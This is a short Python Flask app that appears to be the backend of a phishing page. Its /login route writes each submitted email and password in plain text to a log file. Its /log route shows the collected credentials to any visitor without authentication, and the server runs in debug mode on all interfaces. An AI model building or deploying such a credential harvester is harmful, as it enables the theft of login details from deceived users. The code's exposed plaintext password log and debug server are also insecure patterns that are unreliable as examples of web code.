from flask import Flask, redirect, send_file, request, render_template
import os

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def home():
    return render_template('index.html')


@app.route("/login", methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form['email']
        pwd  = request.form['pwd']
        # print(f"username:{user} password:{pwd}")
        with open("data/log.txt",'a') as file:
            file.write(f"ID:{user} ; PWD:{pwd}\n")
    return render_template('login.html')

@app.route("/log", methods=['GET', 'POST'])
def log():
    try:
        with app.open_resource('data/log.txt') as f:
            contents = f.read()
    except:
        contents = "Noting"
    return render_template('log.html', log=contents)
    
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=4444, debug=True)